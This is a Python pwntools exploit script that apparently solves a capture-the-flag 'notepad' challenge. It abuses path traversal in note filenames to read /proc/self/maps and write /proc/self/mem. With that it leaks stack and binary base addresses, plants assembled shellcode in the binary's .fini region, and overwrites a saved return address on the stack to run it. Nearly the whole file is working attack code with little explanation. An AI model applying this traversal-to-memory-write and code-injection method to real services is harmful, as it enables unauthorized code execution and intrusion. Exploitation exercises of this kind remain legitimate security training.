#!/usr/bin/env python3

from pwn import *
from notepad import *


context.arch = "amd64"

FRONTEND_CONNECT_BACKEND_ADDR = 0x14D7
FRONTEND_EDIT_NOTE_RET_ADDR = 0x2390
FRONTEND_SHOW_NOTE_RET_ADDR = 0x244D

FRONTEND_FINI_OFFSET = 0x2471
FRONTEND_DATA_OFFSET = 0x5000

FRONTEND_MEM_PATH = b"./././././././././././././././././././././././././../../../home/notepad/../../././././././././proc/self/mem"

BACKEND_FRONTEND_MEM_PATH = b"./././././././././././././././././././././././././../../../../home/notepad/../../././././././././proc/1/mem"


def find_root_directory_prefix(r, filename):
    if len(filename) & 1:
        prefix = b"../../../home/notepad/../../"
    else:
        prefix = b"../../../"

    for _ in range(MAX_PATH_LENGTH // 2):
        msg = show_note(r, prefix + filename, 0)
        if b"Read note failed." not in msg:
            return prefix
        prefix = b"./" + prefix

    return b""


def show_file(r, filename):
    prefix = find_root_directory_prefix(r, filename)
    filename = prefix + filename

    print("filename: ", filename)

    file = b""
    while True:
        sub_file = show_note(r, filename, len(file))
        if b"Read note failed.\n" in sub_file:
            break
        file += sub_file
    return file


def show_content(r, filename, offset, length):
    prefix = find_root_directory_prefix(r, filename)
    filename = prefix + filename

    print("filename: ", filename)

    length_to_read = length

    ret = b""
    while length_to_read > 0:
        sub_ret = show_note(
            r,
            filename,
            offset + len(ret),
        )
        ret += sub_ret
        length_to_read -= len(sub_ret)

    return ret[:length]


def write_content(r, filename, content):
    prefix = find_root_directory_prefix(r, filename)
    filename = prefix + filename

    print("filename: ", filename)

    for i in range(0, len(content), MAX_NOTE_LENGTH):
        sub_content = content[i : i + MAX_NOTE_LENGTH]
        edit_note(
            r,
            filename,
            i,
            len(sub_content),
            sub_content,
        )


def get_elf_base_addr(map, elf_name):
    elf_base_addr = 0
    for line in map.split(b"\n"):
        if elf_name in line:
            elf_base_addr = int(line.split(b"-")[0], 16)
            break
    return elf_base_addr


def get_stack_high_addr(map):
    stack_high_addr = 0
    for line in map.split(b"\n"):
        if b"[stack]" in line:
            stack_high_addr = int(line.split(b"-")[1].split(b" ")[0], 16)
            break
    return stack_high_addr


def find_ret_addr_on_stack(r, stack_high_addr, ret_addr, mem_path):
    for i in range(0x0000, 0x3000, MAX_NOTE_LENGTH):
        addr = stack_high_addr - i
        msg = show_note(
            r,
            mem_path,
            addr,
        )
        if ret_addr.to_bytes(8, "little") in msg:
            addr = addr + msg.index(ret_addr.to_bytes(8, "little"))
            return addr
    return 0


"""
# Write the following buf to data section
char buf[1000] = {0};
buf[0] = 0x87;
buf[1] = 0x87;

# Translate the following code to shellcode
int fd = connect_backend();
write(fd, buf, 164);
read(fd, buf, 128);
write(1, buf, 128);

ret # to edit_note
"""


def get_shellcode(elf_base_addr, shellcode_addr, return_addr):
    write_random = f"""
    mov rax, {elf_base_addr + FRONTEND_CONNECT_BACKEND_ADDR}
    call rax
    mov rdi, rax

    mov rax, 0x1
    mov rsi, {elf_base_addr + FRONTEND_DATA_OFFSET}
    mov rdx, 164
    syscall

    mov rax, 0x0
    mov rdx, 128
    syscall

    mov rax, 0x1
    mov rdi, 0x1
    syscall

    mov rsi, {return_addr}
    push rsi
    ret
    """

    shellcode = asm(write_random)

    return shellcode

    # For debug
    # return shellcode + b"\x00\x00\x00\x00\x12\x34\x00\x00\x00\x56\x78\x00\x00\x9a\xbc\xde\x0f" + b"A" * 1000 + b"\x00" * 500 + b"C" * 1000


# The following
# b"\x00\x00\x00\x00\x12\x34\x00\x00\x00\x56\x78\x00\x00\x9a\xbc\xde\x0f"
# should be parsed to
# [(4, b"\x12\x34"), (3, b"\x56\x78"), (2, b"\x9a\xbc\xde\x0f")]
# Also, ensure that the length of sub_shellcode is less than 1000
def parse_shellcode(shellcode):
    parsed_shellcode = []  # list of (number of \x00, sub_shellcode)
    i = 0
    zero_length = 0
    sub_shellcode = b""

    shellcode += b"\x00"  # append \x00 to the end of shellcode to make sure the last sub_shellcode is appended to parsed_shellcode

    while i < len(shellcode):
        if shellcode[i] == 0x00 or len(sub_shellcode) >= 1000:
            parsed_shellcode.append((zero_length, sub_shellcode))

            zero_length = 0
            while i < len(shellcode) and shellcode[i] == 0x00:
                i += 1
                zero_length += 1

            sub_shellcode = b""
        else:
            sub_shellcode += bytes([shellcode[i]])
            i += 1

    return parsed_shellcode


def write_parsed_shellcode(r, addr, parsed_shellcode):
    for zero_length, sub_shellcode in parsed_shellcode:
        addr += zero_length
        edit_note(
            r,
            FRONTEND_MEM_PATH,
            addr,
            len(sub_shellcode),
            sub_shellcode,
        )
        addr += len(sub_shellcode)


def get_backend_info(r):
    # if r is local process, return custom info
    if isinstance(r, process):
        backend_stack_high_addr = 0x7FFFFFFFE000
        backend_high_addr = 0x7FFFF7FF7000
        return backend_stack_high_addr, backend_high_addr

    # if r is remote process, use maps info
    filename = b"proc/1/maps"
    maps = show_file(r, filename)
    print(maps.decode())

    backend_stack_high_addr = get_stack_high_addr(maps)
    print("backend_stack_high_addr: ", hex(backend_stack_high_addr))

    backend_high_addr = get_elf_base_addr(maps, b"/bin/dash")
    print("backend_high_addr: ", hex(backend_high_addr))

    return backend_stack_high_addr, backend_high_addr


def notepad(port):
    r = process("./share/notepad")
    # r = remote(SERVER_IP, port)

    # LOGIN
    username = b"admin"
    password = b"password"

    register(r, username, password)
    login(r, username, password)

    # Get self maps
    filename = b"proc/self/maps"
    maps = show_file(r, filename)
    print(maps.decode())

    # Parse self maps to get stack high address
    stack_high_addr = get_stack_high_addr(maps)
    print("stack_high_addr: ", hex(stack_high_addr))

    # Parse self maps to get elf base address
    elf_base_addr = get_elf_base_addr(maps, "notepad")
    print("elf_base_addr: ", hex(elf_base_addr))

    # Get return address of show_note
    return_addr = elf_base_addr + FRONTEND_SHOW_NOTE_RET_ADDR
    print("return_addr: ", hex(return_addr))

    # Get return address of show_note on stack
    return_addr_stack = find_ret_addr_on_stack(r, stack_high_addr, return_addr, FRONTEND_MEM_PATH)
    print("return_addr_stack: ", hex(return_addr_stack))

    # Get address to put shellcode
    shellcode_addr = elf_base_addr + FRONTEND_FINI_OFFSET
    print("shellcode_addr: ", hex(shellcode_addr))

    # Construct shellcode
    shellcode = get_shellcode(elf_base_addr, shellcode_addr, return_addr)

    # Parse shellcode and write to memory
    parsed_shellcode = parse_shellcode(shellcode)
    write_parsed_shellcode(r, shellcode_addr, parsed_shellcode)

    # Write 0x8787 to data section
    data_addr = elf_base_addr + FRONTEND_DATA_OFFSET
    msg = edit_note(r, FRONTEND_MEM_PATH, data_addr, 4, b"\x87\x87\x00\x00" + b"\x00" * 160)
    print("msg: ", msg)

    # Jump to shellcode
    msg = edit_note(
        r, FRONTEND_MEM_PATH, return_addr_stack, 8, shellcode_addr.to_bytes(8, "little")
    )
    print("msg: ", msg)

    r.interactive()


def main():
    # Load from file 'port.txt'
    with open("port.txt", "r") as f:
        port = int(f.read())

    # try to connect, if error occurs, get new port
    try:
        notepad(port)
    except:
        port = get_service_port()

        # Write new port to file 'port.txt'
        with open("port.txt", "w") as f:
            f.write(str(port))

        notepad(port)


if __name__ == "__main__":
    main()
